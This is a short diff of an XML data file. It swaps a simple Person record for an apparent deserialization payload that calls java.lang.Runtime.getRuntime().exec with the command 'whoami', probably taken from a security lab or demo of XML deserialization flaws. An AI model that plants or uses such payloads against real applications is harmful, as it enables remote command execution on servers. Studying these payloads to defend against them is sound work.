@@ -1,4 +1,3 @@
-<Person>
-    <name>Drunkbaby</name>
-    <age>6</age>
-</Person>
+<java.lang.Runtime>
+    <getRuntime><exec>whoami</exec></getRuntime>
+</java.lang.Runtime>
